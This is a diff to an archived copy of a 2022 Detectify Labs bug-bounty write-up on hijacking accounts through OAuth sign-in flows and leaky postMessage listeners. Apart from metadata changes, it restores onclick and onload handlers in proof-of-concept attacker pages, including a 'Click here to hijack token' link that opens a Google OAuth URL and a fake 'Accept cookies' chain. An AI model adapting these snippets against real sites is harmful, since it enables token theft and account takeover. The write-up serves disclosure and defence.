@@ -6,9 +6,9 @@ resource: "https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-d
 tags: [article, webseclist-reference, en, labs-detectify, oauth, postmessage, auth-bypass, info-leak, sso, iframe, attack-chain, bug-bounty, owasp-a01-2021, owasp-a07-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T01:33:07+00:00"
+  at: "2026-08-16T00:00:48+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/"
@@ -24,7 +24,7 @@ canonical_url: "https://labs.detectify.com/writeups/account-hijacking-using-dirt
 cited_by:
   - "2022.md:5"
 commit: ""
-content_sha256: b68f9b825c8dbafa17a19f476107576ec72689e0eb52ebc151f8652e8414495c
+content_sha256: 0eefe5925e6574e536bea43dfad09756ed30b96ba6fa136e3d1b9f9bf40260d2
 depth: full
 depth_reason: default
 kind: article
@@ -36,8 +36,8 @@ publisher: Labs Detectify
 publisher_english: ""
 raw_sha256: 8fc53888243b0532ad89e614da5b2dd9c482ea583a05767f5ce3775f4c4c6781
 retrieved_from: "https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/"
-retrieved_kind: live
-retrieved_utc: "2026-08-09T01:33:07+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-16T00:00:48+00:00"
 slug: 2022-labs-detectify-account-hijacking-using-dirty-dancing-sign-oauth-flows
 snapshot: ""
 title_english: ""
@@ -52,7 +52,7 @@ translation_of: ""
 - Published: 2022-07-06
 - Original: <https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/>
 - Current location: <https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/>
-- Preserved from: https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ (live) on 2026-08-09
+- Preserved from: https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -488,7 +488,8 @@ style="border:0;width:500px;height:500px"></iframe></div>
 
 ```js
 document.body.innerHTML =
-'<a href="#" https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
+'<a href="#" onclick="
+b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
 Click here to hijack token</a>';
 ```
 
@@ -553,6 +554,7 @@ In this case, I could do a similar method like the first example:
 <div id="leak"><iframe
 id="i" name="i"
 src="https://challenge-iframe.example.com/"
+onload="run()"
 style="border:0;width:500px;height:500px"></iframe></div>
 ```
 
@@ -569,7 +571,8 @@ function run() {
 - In my script being loaded in the sandbox, I replaced the content with the link for the victim:
 
 ```js
-document.body.innerHTML = '<a href="#" https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
+document.body.innerHTML = '<a href="#" onclick="
+b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
 Click here to hijack token</a>';
 ```
 
@@ -683,7 +686,8 @@ On the website that had this storage loaded on the non-happy path of the OAuth-d
 ```html
 <div id="leak"><iframe
 id="i" name="i"
-src="https://cdn.customer12345.analytics.example.com/storage.html" ></iframe></div>
+src="https://cdn.customer12345.analytics.example.com/storage.html"
+onload="run()"></iframe></div>
 ```
 
 - Since the malicious page was now the parent of the iframe, and no origins were defined in the `allowList`, the malicious page could send messages to the iframe to tell the storage to send messages for any updates to the storage. I could also add a listener to the malicious page to listen for any sync-updates from the storage:
@@ -780,7 +784,8 @@ I could then utilize the same methodology like in example #1, but instead of ifr
 ```html
 <div id="leak"><iframe
 id="i" name="i"
-src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg" ></iframe></div>
+src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
+onload="run()"></iframe></div>
 ```
 
 Since no website would be able to patch this themselves, I sent a report to the analytics provider in charge of the CDN instead:
@@ -852,7 +857,7 @@ In this example, I realized the announcement of the chat-api-token would always 
 ```html
 <div id="leak"><iframe
 id="i" name="i"
-src="https://chat-widget.example.com/chat" ></iframe></div>
+src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
 <script>
 var gotToken = false;
 function reloadToCheck() {
@@ -874,7 +879,7 @@ launchChatWindowByPostMessage();
 - Added a link to the malicious page to open up the sign-in-flow that would end up on the page with the chat-widget with the token in the URL:
 
 ```html
-<a href="#" >Click here to hijack token</a>
+<a href="#" onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">Click here to hijack token</a>
 ```
 
 - The `launchChatWindowByPostMessage()`-function will continuously send a postMessage to the main window, if opened, to launch the chat-widget:
@@ -934,13 +939,13 @@ Since all `web_message` response types cannot validate any path of the origin, a
 Attacker page 1:
 
 ```html
-<a href="#" >Accept cookies</a>
+<a href="#" onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a>
 ```
 
 Attacker page 2:
 
 ```html
-<a href="#" >Login to google</a>
+<a href="#" onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a>
 ```
 
 And the `https://example.com/postmessage-proxy` would have something along the lines of:
@@ -1009,3 +1014,29 @@ I’ve had the time of my life
 Frans Rosén
  Security Advisor, Detectify
  @fransrosen
+
+[Twitter ](https://twitter.com/intent/tweet?url=)[LinkedIn ](https://www.linkedin.com/sharing/share-offsite/?url=)
+
+![](https://labs.detectify.com/_next/image/?url=https%3A%2F%2Flabsadmin.detectify.com%2Fapp%2Fuploads%2F2015%2F06%2FFrans_speaker_photo.png&w=128&q=75)
+
+**Frans Rosén**
+
+Security Advisor
+
+## Check out more content
+
+The Detectify AI Agent Alfred fully automates the creation of security tests for new vulnerabilities, from research to a merge request. In its first six …
+
+September 25, 2025
+
+CloudKit, the data storage framework by Apple, has various access controls. These access controls could be misconfigured, even by Apple themselves, which affected Apple’s own apps using CloudKit. This blog post explains in detail three bugs found in iCrowd+, Apple News and Apple Shortcuts with different criticality uncovered by Frans Rosen while hacking Cloudkit. All bugs were reported to and fixed by the Apple Security Bounty program.
+
+September 13, 2021
+
+Security researchers in the Detectify Crowdsource community, Ai Ho (@j3ssiejjj) and Bao Bui (@Jok3rDb), found an undocumented security issue in Adobe Experience Manager (AEM) that bypassed authentication, and left the application open to information disclosure attacks
+
+June 28, 2021
+
+Here’s how I (@Almroot) bought the domain name used in the NS delegations for the ccTLD of the Democratic Republic of Congo (.cd) and temporarily took over 50% of all DNS traffic for the TLD
+
+January 15, 2021
